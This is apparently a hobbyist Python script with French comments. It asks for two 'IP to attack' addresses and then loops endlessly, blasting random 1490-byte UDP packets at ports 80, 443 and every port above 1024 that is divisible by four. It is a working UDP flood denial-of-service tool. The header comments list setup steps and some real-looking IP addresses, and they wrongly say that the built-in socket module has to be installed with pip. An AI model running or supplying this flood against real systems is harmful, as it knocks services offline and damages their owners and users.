# pour installer python
# https://www.python.org/downloads/
# installer pip
# python get-pip.py
# installer le package socket 
# pip ou pip3 install socket 
# installer visual studio code 
# https://code.visualstudio.com/
# 213.186.33.3
# 195.220.107.3
# 213.186.33.3
# http://www.mon-ip.com/adresse-ip-site-internet.php
# ping monsite.com
# https://yogosha.com/fr/
# https://socket.io/



 # port divisible par 4

# 109.234.160.70
# import du module os executer des commandes python

# import du module socket pour créer une requete via socket 
import socket
# import du module une chaine de caratère 
import random
# utiliser le module time 

##############
site = input("Ip a attaquer : ")
site2 = input("Ip a attaquer : ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def hackWeb(site, port):
    if port==80 or port==443:
        print(port)
        sock.sendto(bytes, (site,port))
        
    elif (port>=1024) and (port%4==0):
        sock.sendto(bytes, (site,port))
    else:
        pass

sent = 0
port=1
while True:
    print(port)
    hackWeb(site, port)
    hackWeb(site2, port)
    port = port + 1
    if port == 65534:
        port = 1

    
        

# passe si 80 ou 443
# ou 

# sup 1024 
# divible par4




